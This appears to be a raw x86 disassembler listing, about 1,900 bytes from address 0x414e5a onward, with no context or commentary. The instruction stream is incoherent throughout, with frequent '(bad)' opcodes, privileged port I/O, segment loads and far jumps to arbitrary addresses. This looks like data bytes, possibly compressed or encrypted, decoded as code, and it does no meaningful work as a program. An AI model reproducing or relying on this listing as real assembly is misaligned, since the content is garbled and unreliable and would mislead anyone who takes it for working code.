  414e5a:	stos   BYTE PTR es:[edi],al
  414e5b:	fidivr DWORD PTR [eax]
  414e5d:	xor    DWORD PTR ds:0x95c13d8f,eax
  414e63:	jo     0x414e4b
  414e65:	cmp    ecx,esi
  414e67:	enter  0x26b5,0xac
  414e6b:	cli    
  414e6c:	or     ebx,DWORD PTR [ecx-0x3]
  414e6f:	popf   
  414e70:	push   ebp
  414e71:	pop    esi
  414e72:	out    0xd0,al
  414e74:	jns    0x414e24
  414e76:	and    al,0x8
  414e78:	js     0x414e47
  414e7a:	lea    eax,[eax]
  414e7c:	adc    bl,BYTE PTR cs:[ecx+eiz*4]
  414e80:	adc    BYTE PTR [ebp+0x5c],al
  414e83:	sbb    BYTE PTR [eax],bh
  414e85:	es retf 0xd998
  414e89:	add    DWORD PTR [edx],ecx
  414e8b:	outs   dx,DWORD PTR ds:[esi]
  414e8c:	pop    es
  414e8d:	pop    ss
  414e8e:	and    al,0x26
  414e90:	fnstsw ax
  414e92:	ins    DWORD PTR es:[edi],dx
  414e93:	or     DWORD PTR [edx-0x67],edx
  414e96:	inc    eax
  414e97:	sbb    al,0x27
  414e99:	jo     0x414e72
  414e9b:	ret    
  414e9c:	pop    ebx
  414e9d:	cmc    
  414e9e:	xor    BYTE PTR [ecx-0x6e],dh
  414ea1:	call   0x2a48472d
  414ea6:	mov    cl,0xee
  414ea8:	pop    ds
  414ea9:	lods   eax,DWORD PTR ds:[esi]
  414eaa:	shr    ch,0xf9
  414ead:	push   ebp
  414eae:	std    
  414eaf:	cld    
  414eb0:	mov    esi,0xc9561f8e
  414eb5:	cs pop edi
  414eb7:	and    BYTE PTR [ebx+ebx*4],0x81
  414ebb:	cmc    
  414ebc:	ja     0x414ec4
  414ebe:	sti    
  414ebf:	cli    
  414ec0:	add    al,0xd
  414ec2:	and    ch,dl
  414ec4:	or     eax,0x43e7d4f2
  414ec9:	adc    al,0x8
  414ecb:	ins    BYTE PTR es:[edi],dx
  414ecc:	aas    
  414ecd:	pushf  
  414ece:	ret    0x8e10
  414ed1:	jge    0x414e8b
  414ed3:	es push ebp
  414ed5:	pushf  
  414ed6:	outs   dx,BYTE PTR ds:[esi]
  414ed7:	repnz test WORD PTR [ebp+eax*1-0xb4b732e],0x6612
  414ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ee3:	mov    al,ds:0x1cd28d61
  414ee9:	scas   al,BYTE PTR es:[edi]
  414eea:	push   ds
  414eeb:	mov    dl,0xa1
  414eed:	cmp    eax,0x45b4a572
  414ef2:	das    
  414ef3:	mov    ss,WORD PTR [esi]
  414ef5:	xchg   esi,eax
  414ef6:	jbe    0x414e93
  414ef8:	inc    esi
  414ef9:	les    eax,FWORD PTR [ebp-0xcd514c0]
  414eff:	lea    esp,[ebx-0x13]
  414f02:	dec    eax
  414f03:	push   ecx
  414f04:	add    ebx,ebp
  414f06:	pop    esp
  414f07:	scas   al,BYTE PTR es:[edi]
  414f08:	sahf   
  414f09:	test   DWORD PTR [edx],ecx
  414f0b:	test   DWORD PTR [ebp-0x34],esp
  414f0e:	(bad)  
  414f0f:	fnstenv [esi-0x72f31e23]
  414f15:	out    0x86,eax
  414f17:	test   eax,0x1ca32c4b
  414f1c:	dec    edi
  414f1d:	inc    ebp
  414f1e:	je     0x414f53
  414f20:	push   esp
  414f21:	pop    ds
  414f22:	inc    esp
  414f23:	and    ebp,edx
  414f25:	mov    ss,ebx
  414f27:	int    0xbd
  414f29:	cli    
  414f2a:	fldz   
  414f2c:	arpl   WORD PTR [esi],ax
  414f2e:	mov    ds:0xe417a752,al
  414f33:	sub    al,0x85
  414f35:	adc    al,0x16
  414f37:	clc    
  414f38:	add    ecx,DWORD PTR [ecx]
  414f3a:	mov    esi,0x511810da
  414f3f:	fisttp DWORD PTR es:[edi+0x2f]
  414f43:	popa   
  414f44:	inc    edx
  414f45:	push   edx
  414f46:	pop    ds
  414f47:	(bad)  
  414f48:	push   ss
  414f49:	ds out 0xb7,al
  414f4c:	cmc    
  414f4d:	cld    
  414f4e:	xchg   edx,eax
  414f4f:	loope  0x414f95
  414f51:	pusha  
  414f52:	out    dx,al
  414f53:	cwde   
  414f54:	adc    edi,DWORD PTR [ebx+0x4a]
  414f57:	add    DWORD PTR [esi],ebp
  414f59:	pop    esp
  414f5a:	aas    
  414f5b:	int3   
  414f5c:	sbb    al,0x33
  414f5e:	std    
  414f5f:	mov    DWORD PTR [ebp+0x5eee4bee],edi
  414f65:	(bad)  
  414f66:	dec    esp
  414f67:	or     al,0xeb
  414f69:	mov    al,ds:0x5c83bffd
  414f6e:	sub    dl,bh
  414f70:	ficomp DWORD PTR [ebx-0x1684f1e]
  414f76:	je     0x414f8f
  414f78:	xor    BYTE PTR [ebx-0x15],bh
  414f7b:	shr    edx,cl
  414f7d:	push   es
  414f7e:	arpl   WORD PTR [ecx+0x2e4d2710],bp
  414f84:	arpl   WORD PTR [edx-0x7e],di
  414f87:	mov    ds:0x9b7dcfaa,al
  414f8c:	sar    DWORD PTR [edi],cl
  414f8e:	enter  0xd91,0x43
  414f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f93:	rol    edx,cl
  414f95:	in     eax,0x49
  414f97:	retf   0x24e3
  414f9a:	scas   al,BYTE PTR es:[edi]
  414f9b:	xor    al,0x51
  414f9d:	sub    dl,BYTE PTR [edx-0x10]
  414fa0:	loopne 0x414fc3
  414fa2:	sbb    edi,DWORD PTR [edx-0x17]
  414fa5:	lods   al,BYTE PTR ds:[esi]
  414fa6:	jmp    0xd79cd790
  414fab:	xor    ah,BYTE PTR [ebx+eax*4+0x65cd606c]
  414fb2:	add    eax,0xd36608ac
  414fb7:	popa   
  414fb8:	and    BYTE PTR [edi+0x34],0x47
  414fbc:	jb     0x414f58
  414fbe:	pop    es
  414fbf:	inc    ebp
  414fc0:	xor    ebp,DWORD PTR [ebx]
  414fc2:	xchg   edx,eax
  414fc3:	cld    
  414fc4:	sar    al,1
  414fc6:	mov    ds:0x99a0a12,eax
  414fcb:	adc    eax,0xe5fbd189
  414fd0:	push   cs
  414fd1:	cli    
  414fd2:	out    0x7f,al
  414fd4:	adc    eax,0x2b24731b
  414fd9:	xchg   edx,eax
  414fda:	push   esi
  414fdb:	and    DWORD PTR [eax+0x2a],ecx
  414fde:	enter  0xd963,0xf1
  414fe2:	add    eax,0x9789b59e
  414fe7:	and    eax,DWORD PTR [esi+0x3f]
  414fea:	jp     0x415022
  414fec:	cld    
  414fed:	in     eax,0xd2
  414fef:	cld    
  414ff0:	outs   dx,BYTE PTR ds:[esi]
  414ff1:	rol    DWORD PTR [edx-0x26b21471],1
  414ff7:	scas   eax,DWORD PTR es:[edi]
  414ff8:	jo     0x41501e
  414ffa:	or     BYTE PTR [esi+0x54],ch
  414ffd:	pop    ebx
  414ffe:	adc    eax,0xf86edcac
  415003:	mov    ds:0x82f6c6b1,al
  415008:	sub    eax,0x566c98e5
  41500d:	mov    bh,0x1c
  41500f:	jno    0x414fe2
  415011:	les    esi,FWORD PTR [edi-0x73e73292]
  415017:	addr16 loop 0x415045
  41501a:	sub    al,0x6b
  41501c:	jbe    0x414fce
  41501e:	sub    eax,0x456e0caf
  415023:	std    
  415024:	push   eax
  415025:	cwde   
  415026:	mov    ebx,0xc834806f
  41502b:	xor    ecx,eax
  41502d:	dec    ebp
  41502e:	sub    eax,0x68eee79
  415033:	rcl    BYTE PTR [ebp+0x34],1
  415036:	mov    ds:0x13553379,al
  41503b:	pop    ebx
  41503c:	sti    
  41503d:	mov    dl,0xe9
  41503f:	sub    bl,BYTE PTR [edx]
  415041:	fdiv   QWORD PTR [edi-0x4e554867]
  415047:	mov    ch,0xa3
  415049:	mov    ah,0x88
  41504b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41504c:	rcr    BYTE PTR [eax+0x39],1
  41504f:	fnstenv [ecx+0x54]
  415052:	fprem  
  415054:	pop    esp
  415055:	mov    bl,BYTE PTR [esi+0x6a]
  415058:	pushf  
  415059:	div    BYTE PTR [ebp+0x39a8ad8f]
  41505f:	xor    DWORD PTR [edx+0x78c1ff3b],0xff306339
  415069:	test   DWORD PTR [ebx+esi*4+0x24],0x10fb4e11
  415071:	aaa    
  415072:	pop    es
  415073:	mov    eax,ds:0xa0bb3c40
  415078:	neg    BYTE PTR [esi+edi*8+0x23]
  41507c:	xor    dh,BYTE PTR [ebp-0x2c]
  41507f:	shl    DWORD PTR [edx],1
  415081:	das    
  415082:	rcr    DWORD PTR [esi-0x7c],0x36
  415086:	out    0x72,al
  415088:	push   eax
  415089:	cld    
  41508a:	pop    es
  41508b:	pushf  
  41508c:	mov    al,ds:0x8e8a25a4
  415091:	adc    al,0x97
  415093:	pop    edi
  415094:	call   0x6aeb2642
  415099:	sub    al,0x83
  41509b:	sub    DWORD PTR [ebx+0x497b058e],0x5d
  4150a2:	cld    
  4150a3:	push   esp
  4150a4:	or     DWORD PTR [ebx],0xffffffc7
  4150a7:	xor    eax,0x2bc94cd6
  4150ac:	mov    cl,0xdf
  4150ae:	and    cl,dh
  4150b0:	sbb    BYTE PTR ds:0xc34ebbfb,bh
  4150b6:	loope  0x415088
  4150b8:	clc    
  4150b9:	pushf  
  4150ba:	fdiv   DWORD PTR [esi+0x2c]
  4150bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150be:	(bad)  
  4150bf:	sti    
  4150c0:	jle    0x415125
  4150c2:	sbb    ch,cl
  4150c4:	test   DWORD PTR gs:[esi-0xb],esi
  4150c8:	mov    dl,0x75
  4150ca:	js     0x415069
  4150cc:	jb     0x415142
  4150ce:	cmp    DWORD PTR [ecx-0x7c],esp
  4150d1:	cmp    esi,DWORD PTR [edx]
  4150d3:	retf   0xe703
  4150d6:	mov    esp,0xf00e3ae9
  4150db:	pop    ss
  4150dc:	jns    0x4150b5
  4150de:	push   ecx
  4150df:	sub    ah,BYTE PTR [ecx-0x778ad74a]
  4150e5:	aaa    
  4150e6:	sub    BYTE PTR ds:0x2492dc48,dh
  4150ec:	and    edi,esp
  4150ee:	mov    edx,0xb07c72d8
  4150f3:	or     eax,0xdf600de6
  4150f8:	pop    ebp
  4150f9:	mov    esi,DWORD PTR [edx+0x31]
  4150fc:	in     eax,dx
  4150fd:	cmc    
  4150fe:	mov    edx,ebx
  415100:	loope  0x415141
  415102:	cmp    BYTE PTR [ebx-0x22],dh
  415105:	mov    ecx,0x468d4b69
  41510a:	leave  
  41510b:	mov    dh,0xda
  41510d:	adc    BYTE PTR [eax],0x67
  415110:	mov    al,0x66
  415112:	retf   
  415113:	inc    esi
  415114:	lods   al,BYTE PTR ds:[esi]
  415115:	test   eax,0xd0ef6030
  41511a:	js     0x4150a6
  41511c:	cmp    eax,0xec910ff
  415121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415122:	data16 jnp 0x4150d0
  415125:	xor    ch,BYTE PTR [eax+0x57]
  415128:	test   edx,ebp
  41512a:	nop/reserved BYTE PTR [ebx-0x4b]
  41512e:	add    BYTE PTR [ebx],0x75
  415131:	sub    cl,BYTE PTR fs:[ecx-0x60]
  415135:	mov    bl,0xd0
  415137:	mov    ch,BYTE PTR [eax+eiz*2]
  41513a:	scas   eax,DWORD PTR es:[edi]
  41513b:	pusha  
  41513c:	call   0xf313359a
  415141:	cmp    edi,DWORD PTR [esi]
  415143:	jnp    0x41519e
  415145:	and    eax,0x22aa03f2
  41514a:	dec    edx
  41514b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41514c:	call   0x8beb4899
  415151:	xchg   ebx,eax
  415152:	mov    al,0x9e
  415154:	lea    eax,[esi]
  415156:	bound  esi,QWORD PTR [ebx+0x2daf05d6]
  41515c:	cmp    esi,DWORD PTR [ecx+0x18e2305a]
  415162:	or     eax,0xfeb4cc3c
  415167:	ret    0x202d
  41516a:	jecxz  0x4151bd
  41516c:	cmp    BYTE PTR [ebp-0x5c4fa7cc],ah
  415172:	enter  0x9c20,0x99
  415176:	xchg   dh,bh
  415178:	cmp    eax,0x2a6cc13b
  41517d:	ds nop
  41517f:	xchg   ebx,eax
  415180:	or     DWORD PTR [edi],0xffffff99
  415183:	jle    0x4151e7
  415185:	ror    BYTE PTR [ecx-0x40da1288],0xf9
  41518c:	and    dl,BYTE PTR [eax-0x4a]
  41518f:	ror    DWORD PTR [ecx-0x10d427a8],0xbd
  415196:	add    al,0x12
  415198:	pushf  
  415199:	inc    esp
  41519a:	jnp    0x415167
  41519c:	push   ebp
  41519d:	adc    BYTE PTR [ebx],dl
  41519f:	sbb    al,0xcc
  4151a1:	adc    BYTE PTR [edx],ch
  4151a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151a4:	fbld   TBYTE PTR [ebx-0x13526175]
  4151aa:	xor    al,0x74
  4151ac:	pop    ss
  4151ad:	mov    esi,0x6b467744
  4151b2:	test   al,0xa4
  4151b4:	push   esp
  4151b5:	inc    ecx
  4151b6:	mov    eax,0xa5ac7f3d
  4151bb:	in     eax,0x2e
  4151bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151be:	ins    DWORD PTR es:[edi],dx
  4151bf:	rol    DWORD PTR [eax+0x47],cl
  4151c2:	or     al,0x99
  4151c4:	mov    edx,0x7c9a5685
  4151c9:	loop   0x415197
  4151cb:	dec    ebx
  4151cc:	inc    edi
  4151cd:	(bad)  
  4151ce:	rcl    BYTE PTR [eax-0x568f1d4d],0x16
  4151d5:	or     al,0xcf
  4151d7:	xor    dl,ch
  4151d9:	imul   esi,DWORD PTR [ebx-0x7d55fd7e],0x2
  4151e0:	fwait
  4151e1:	xor    al,0x7f
  4151e3:	dec    esp
  4151e4:	(bad)  
  4151e5:	mov    bh,0xc7
  4151e7:	jae    0x4151e4
  4151e9:	cmp    cl,BYTE PTR [ebx]
  4151eb:	jnp    0x415241
  4151ed:	icebp  
  4151ee:	lahf   
  4151ef:	inc    ebp
  4151f0:	mov    edi,0xba9ab69b
  4151f5:	jb     0x415259
  4151f7:	fs jne 0x4151f5
  4151fa:	pop    ebp
  4151fb:	sar    BYTE PTR [ebx-0x315f8384],1
  415201:	jmp    0xd63d68f2
  415206:	jecxz  0x415209
  415208:	(bad)  
  415209:	pop    ecx
  41520a:	hlt    
  41520b:	mov    ch,0x54
  41520d:	cli    
  41520e:	gs dec ebx
  415210:	idiv   BYTE PTR [eax-0x2f271ee0]
  415216:	(bad)  
  415217:	jmp    0x5ab16f3
  41521c:	out    0x49,eax
  41521e:	stos   BYTE PTR es:[edi],al
  41521f:	(bad)  
  415220:	jmp    0xde29:0x7d01274b
  415227:	mov    eax,0x4ea9f286
  41522c:	adc    edx,ebx
  41522e:	dec    eax
  41522f:	adc    eax,0x83c2c84e
  415234:	ins    BYTE PTR es:[edi],dx
  415235:	mov    ebx,0x49cc8bbc
  41523a:	icebp  
  41523b:	int    0x18
  41523d:	add    DWORD PTR [ebp-0x4d],0xfffffff3
  415241:	lds    eax,FWORD PTR [esi-0x4c]
  415244:	mov    edx,0x3714216f
  415249:	bound  eax,QWORD PTR [ebx+0x31]
  41524c:	mov    eax,0x924bb8e7
  415251:	ret    0xdb2
  415254:	and    al,0x97
  415256:	(bad)  
  415257:	mov    dh,0x11
  415259:	xchg   ecx,eax
  41525a:	mov    BYTE PTR [edx+0x30c1a83c],ah
  415260:	mov    bl,0xa4
  415262:	add    eax,0xa0a3fb25
  415267:	clc    
  415268:	jle    0x4152af
  41526a:	(bad)  
  41526b:	xchg   ebp,eax
  41526c:	push   ss
  41526d:	jo     0x415246
  41526f:	jp     0x4152b4
  415271:	jg     0x4152ea
  415273:	xchg   BYTE PTR [esi-0x2e],ah
  415276:	push   0x30
  415278:	out    dx,eax
  415279:	push   esp
  41527a:	xchg   BYTE PTR [edi-0x5997f9ca],dh
  415280:	mov    eax,0xdad88c41
  415285:	jecxz  0x41521a
  415287:	ja     0x4152cb
  415289:	ss repz scas al,BYTE PTR es:[edi]
  41528c:	pop    esp
  41528d:	add    ch,BYTE PTR [eax]
  41528f:	pop    edx
  415290:	or     ebx,DWORD PTR [ebx+0x62fe028f]
  415296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415297:	repz imul eax,DWORD PTR [ebx-0x2b],0x1f
  41529c:	adc    al,0xbb
  41529e:	popf   
  41529f:	into   
  4152a0:	(bad)  
  4152a2:	push   ss
  4152a3:	push   edx
  4152a4:	inc    esi
  4152a5:	mul    DWORD PTR gs:0x6610062e
  4152ac:	pop    esi
  4152ad:	jp     0x415319
  4152af:	jl     0x41524e
  4152b1:	push   ss
  4152b2:	test   dl,0x30
  4152b5:	jp     0x41526e
  4152b7:	shl    cl,0x35
  4152ba:	adc    eax,0x43126fc9
  4152bf:	inc    esp
  4152c0:	adc    al,0x3b
  4152c2:	cmc    
  4152c3:	shr    DWORD PTR [ebp+ebx*8+0x7b4b8ab8],cl
  4152ca:	push   0x3847a54a
  4152cf:	jecxz  0x41527f
  4152d1:	scas   al,BYTE PTR es:[edi]
  4152d2:	inc    esp
  4152d3:	or     eax,0x1f63b81d
  4152d8:	push   ecx
  4152d9:	mov    bl,0x69
  4152db:	ficom  DWORD PTR [ebx+0x76d77f3a]
  4152e1:	inc    eax
  4152e2:	sub    edi,esp
  4152e4:	test   BYTE PTR [ebx],dl
  4152e6:	(bad)  
  4152e8:	push   esi
  4152e9:	xchg   edi,eax
  4152ea:	cmp    dl,BYTE PTR [ebx+0x7e]
  4152ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152ee:	test   al,0xc0
  4152f0:	xchg   edi,eax
  4152f1:	mov    ebx,ebp
  4152f3:	movq   mm0,QWORD PTR ds:0xa8949513
  4152fa:	sub    cl,cl
  4152fc:	xor    ebx,esi
  4152fe:	adc    DWORD PTR [esi+edx*1-0x1d],ecx
  415302:	mov    esi,0xca679604
  415307:	mov    cl,0xc7
  415309:	mov    ah,0x4c
  41530b:	cmovbe esi,esp
  41530e:	xor    bh,BYTE PTR [eax-0x5a7f908]
  415314:	iret   
  415315:	je     0x415346
  415317:	cmc    
  415318:	test   eax,0xb5fd4bc0
  41531d:	add    eax,0xe999619a
  415322:	sub    eax,0x8118e586
  415327:	test   DWORD PTR [edi+esi*1],edi
  41532a:	and    ecx,DWORD PTR [ebp-0x7b]
  41532d:	jecxz  0x41536c
  41532f:	adc    edi,DWORD PTR [edi-0x110f40b3]
  415335:	mov    ?,WORD PTR [edi]
  415337:	stos   DWORD PTR es:[edi],eax
  415338:	pop    edi
  415339:	test   BYTE PTR [ebp+0x60],cl
  41533c:	pop    ds
  41533d:	adc    al,0xc4
  41533f:	adc    bl,BYTE PTR [eax+0x24537652]
  415345:	arpl   di,bp
  415347:	dec    edx
  415348:	ret    
  415349:	repnz adc BYTE PTR ds:0xe195a1a6,0x25
  415351:	pusha  
  415352:	mov    edx,0x43f83086
  415357:	ins    DWORD PTR es:[edi],dx
  415358:	mov    es,WORD PTR [ecx-0x35]
  41535b:	and    eax,0xafec933f
  415360:	mov    gs,WORD PTR [ecx+0x61]
  415363:	xor    eax,0x7b6a89c2
  415368:	fwait
  415369:	adc    ah,BYTE PTR cs:[edi+ebx*4]
  41536d:	lock fild WORD PTR ds:0x8be19202
  415374:	loop   0x415323
  415376:	fwait
  415377:	aaa    
  415378:	mov    bh,0x82
  41537a:	push   esp
  41537b:	xor    al,0x1e
  41537d:	jns    0x415311
  41537f:	shr    ecx,cl
  415381:	sub    eax,0x2ae9e6a9
  415386:	mov    ebx,0x6df483f1
  41538b:	push   eax
  41538c:	scas   eax,DWORD PTR es:[edi]
  41538d:	sahf   
  41538e:	adc    al,0x46
  415390:	sbb    ebp,DWORD PTR [ebp+0x3a4b1aad]
  415396:	sbb    BYTE PTR [esi+edx*1-0x72],ch
  41539a:	push   eax
  41539b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41539c:	sub    eax,DWORD PTR [ecx]
  41539e:	int3   
  41539f:	ins    BYTE PTR es:[edi],dx
  4153a0:	sub    al,0xd5
  4153a2:	add    edi,DWORD PTR [edx+0x4b]
  4153a5:	popfw  
  4153a7:	cmp    DWORD PTR [ebp-0x6bfa701],edi
  4153ad:	fcomi  st,st(6)
  4153af:	and    dh,al
  4153b1:	fwait
  4153b2:	ds or  ah,cl
  4153b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153b6:	push   0xffffff93
  4153b8:	cmp    ebx,DWORD PTR [esi-0x6c]
  4153bb:	sahf   
  4153bc:	test   al,0x6f
  4153be:	outs   dx,DWORD PTR ds:[esi]
  4153bf:	pop    ds
  4153c0:	xchg   esi,eax
  4153c1:	mov    ecx,0x94dcf35a
  4153c6:	arpl   WORD PTR [edx+0x0],si
  4153c9:	inc    esp
  4153ca:	jno    0x41534d
  4153cc:	pop    ebp
  4153cd:	push   0x765246dc
  4153d2:	test   DWORD PTR [ecx],0xb797459
  4153d8:	push   0x1f
  4153da:	call   0x5588:0x3e36e12e
  4153e1:	or     al,0xa
  4153e3:	jg     0x41539d
  4153e5:	push   edi
  4153e6:	mov    al,0x68
  4153e8:	(bad)
  4153ed:	mov    ch,0xce
  4153ef:	out    dx,al
  4153f0:	adc    dh,BYTE PTR [edx+eiz*1-0x59]
  4153f4:	into   
  4153f5:	inc    ebp
  4153f6:	iret   
  4153f7:	pop    DWORD PTR [edi]
  4153f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153fa:	add    edx,0x50
  4153fd:	jg     0x41539b
  4153ff:	push   ds
  415400:	lods   eax,DWORD PTR ds:[esi]
  415401:	xor    al,0x53
  415403:	xchg   edi,eax
  415404:	pop    ds
  415405:	aaa    
  415406:	add    al,0x30
  415408:	in     al,0x2b
  41540a:	push   ecx
  41540b:	jmp    0x41540d
  41540d:	cmp    eax,0xb81480c7
  415412:	dec    esp
  415413:	or     al,ch
  415415:	cmp    ch,BYTE PTR [edi+0x151e3e02]
  41541b:	les    esi,FWORD PTR [edi+edi*2-0x72]
  41541f:	pop    esp
  415420:	loop   0x4153b6
  415422:	mov    ds:0x7f0bf6f8,al
  415427:	mov    al,ds:0x8f8d2e95
  41542c:	pop    eax
  41542d:	call   FWORD PTR [ecx+eax*4-0x676bd551]
  415434:	xchg   esp,eax
  415435:	jle    0x415438
  415437:	push   es
  415438:	jns    0x415489
  41543a:	push   esi
  41543b:	jl     0x41542e
  41543d:	loop   0x415402
  41543f:	mov    edx,0xc3f5636e
  415444:	pop    ebx
  415445:	aaa    
  415446:	mul    BYTE PTR [ecx+0x7bf85aa9]
  41544c:	cld    
  41544d:	xcrypt-ofb (bad)
  41544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41544f:	in     al,dx
  415450:	mov    eax,0x11cd8532
  415455:	adc    al,0xe4
  415457:	dec    ebp
  415458:	push   0x41
  41545a:	sub    DWORD PTR [edi],0x3a1daf69
  415460:	in     eax,0x19
  415462:	mov    ah,0x60
  415464:	xchg   edx,eax
  415465:	stos   DWORD PTR es:[edi],eax
  415466:	and    eax,0xc69e9f5a
  41546b:	in     al,0x6f
  41546d:	in     eax,dx
  41546e:	inc    eax
  41546f:	xchg   edx,eax
  415470:	outs   dx,DWORD PTR ds:[esi]
  415471:	outs   dx,BYTE PTR ds:[esi]
  415472:	pop    DWORD PTR [ebx]
  415474:	int3   
  415475:	aas    
  415476:	loop   0x41544b
  415478:	add    al,0xfd
  41547a:	cmp    eax,DWORD PTR [ebx+eiz*1]
  41547d:	sub    DWORD PTR ss:[ecx-0xfeed466],ecx
  415484:	mov    ebx,0x4ece7d7c
  415489:	out    0x1b,eax
  41548b:	inc    eax
  41548c:	cs jns 0x4154aa
  41548f:	lods   eax,DWORD PTR ds:[esi]
  415490:	cmp    al,BYTE PTR [eax-0x30]
  415493:	outs   dx,BYTE PTR ds:[esi]
  415494:	cmp    bl,BYTE PTR [eax+0x44]
  415497:	xor    al,0xad
  415499:	mov    eax,0x1640d8e0
  41549e:	cmp    DWORD PTR [esp+eiz*2],edx
  4154a1:	xchg   esi,eax
  4154a2:	je     0x415479
  4154a4:	int    0x2c
  4154a6:	cld    
  4154a7:	mov    ecx,0x9e327145
  4154ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154ad:	xchg   esp,eax
  4154ae:	mov    al,0x94
  4154b0:	and    al,0xd3
  4154b2:	adc    eax,0x4bbd32ae
  4154b7:	scas   al,BYTE PTR es:[edi]
  4154b8:	fld    QWORD PTR [eax+eiz*2-0x66bdf375]
  4154bf:	scas   al,BYTE PTR es:[edi]
  4154c0:	or     al,0x8a
  4154c2:	dec    edi
  4154c3:	xor    eax,0x913d6c4c
  4154c8:	cld    
  4154c9:	mov    esi,DWORD PTR [eax]
  4154cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154cc:	loop   0x415521
  4154ce:	pop    eax
  4154cf:	and    bl,bh
  4154d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d2:	(bad)  
  4154d3:	in     eax,0x77
  4154d5:	into   
  4154d6:	sahf   
  4154d7:	stos   BYTE PTR es:[edi],al
  4154d8:	mov    eax,0x65acc5b7
  4154dd:	(bad)  
  4154df:	int3   
  4154e0:	mov    dh,0x7
  4154e2:	adc    al,0xeb
  4154e4:	lock nop
  4154e6:	push   0x8
  4154e8:	(bad)
  4154ec:	fbld   TBYTE PTR [esp+ecx*4+0x62]
  4154f0:	push   esp
  4154f1:	in     al,0x30
  4154f3:	lahf   
  4154f4:	pop    ecx
  4154f5:	mov    ah,0xc9
  4154f7:	ds ja  0x415575
  4154fa:	shl    DWORD PTR cs:[ebp-0x6ed0ef38],cl
  415501:	and    BYTE PTR [ebp-0x31dd286],dh
  415507:	(bad)  
  415508:	in     al,dx
  415509:	jle    0x41549f
  41550b:	or     cl,dh
  41550d:	repnz fsub DWORD PTR [edx+0x4c]
  415511:	popf   
  415512:	ret    0x501d
  415515:	mov    WORD PTR [esi+0x324ae4f9],gs
  41551b:	ret    
  41551c:	or     eax,0x87926942
  415521:	dec    edx
  415522:	jmp    0x35d421dd
  415527:	into   
  415528:	dec    esp
  415529:	or     eax,0x3cbbeef3
  41552e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41552f:	ins    BYTE PTR es:[edi],dx
  415530:	in     eax,0xe8
  415532:	add    BYTE PTR [eax],bh
  415534:	and    ch,BYTE PTR [edi-0x66]
  415537:	int    0x88
  415539:	cmc    
  41553a:	adc    DWORD PTR [esi],ebp
  41553c:	aam    0xfb
  41553e:	mov    dl,0x7f
  415540:	mov    cs,edi
  415542:	adc    DWORD PTR [edi+0x19b1e5cd],esp
  415548:	mov    al,BYTE PTR [esi+0x6e61ff13]
  41554e:	or     eax,DWORD PTR [ecx]
  415550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415551:	fsubr  DWORD PTR [eax+0x6605c7f7]
  415557:	add    eax,0xf2f6d390
  41555c:	mov    bl,0xec
  41555e:	outs   dx,BYTE PTR ds:[esi]
  41555f:	ins    BYTE PTR es:[edi],dx
  415560:	xor    DWORD PTR [ecx+0x275ddf1e],ebx
  415566:	ins    DWORD PTR es:[edi],dx
  415567:	cmp    edx,esi
  415569:	push   es
  41556a:	cwde   
  41556b:	data16 stc 
  41556d:	ja     0x41554f
  41556f:	test   eax,0x28fd79b6
  415574:	jl     0x415537
  415576:	xchg   ecx,eax
  415577:	mov    cl,0x1f
  415579:	loope  0x41559c
  41557b:	imul   edi,DWORD PTR [ebx+0x19],0xf5b2337d
  415582:	pop    ebx
  415583:	ret    
  415584:	lahf   
  415585:	les    esp,FWORD PTR [ebx]
  415587:	jbe    0x415593
  415589:	loop   0x415599
  41558b:	fxch   st(3)
  41558d:	mov    eax,ds:0x932ffa94
  415592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415593:	outs   dx,BYTE PTR ds:[esi]
  415594:	push   ebx
  415595:	gs (bad) 
  415597:	cmp    eax,0x373a3b0a
  41559c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41559d:	add    eax,0x6c044622
  4155a2:	sbb    BYTE PTR [eax+0xe],dh
  4155a5:	xchg   edi,eax
  4155a6:	mov    esi,0xa0d8051e
  4155ab:	fmul   QWORD PTR [ecx+0x76]
  4155ae:	inc    edi
  4155af:	adc    ecx,edx
  4155b1:	xchg   edi,eax
  4155b2:	in     al,dx
  4155b3:	sbb    BYTE PTR [edx+0x77],cl
  4155b6:	mov    eax,0x7ba4af9d
  4155bb:	pop    ecx
  4155bc:	add    eax,DWORD PTR [edx-0xf]
  4155bf:	sub    al,0xd1
  4155c1:	call   0x1b4b:0x637d2cc9
  4155c8:	and    ecx,edx
  4155ca:	and    al,0xf5
  4155cc:	shr    BYTE PTR [esp+edx*8+0x51],1
  4155d0:	rol    BYTE PTR [esi],cl
  4155d2:	loope  0x415600
  4155d4:	popa   
  4155d5:	xchg   BYTE PTR [ebp-0x74f6af1],cl
  4155db:	std    
  4155dc:	clc    
  4155dd:	inc    di
  4155df:	mov    dh,0x45
  4155e1:	fbld   TBYTE PTR ds:0x2e08e105
  4155e7:	lods   eax,DWORD PTR ds:[esi]
  4155e8:	and    dl,BYTE PTR [edi-0x35be7b6f]
  4155ee:	push   esi
  4155ef:	sub    DWORD PTR [ebx+0x42],ebx
  4155f2:	sub    eax,DWORD PTR [ebx+0x5f4081ba]
  4155f8:	sbb    DWORD PTR [ecx-0x27],edi
  4155fb:	iret   
  4155fc:	cwde   
  4155fd:	mov    ch,0x62
  4155ff:	vpaddsb xmm1,xmm4,XMMWORD PTR [ecx]
  415603:	pop    esp
  415604:	add    BYTE PTR [esi+0x0],dh
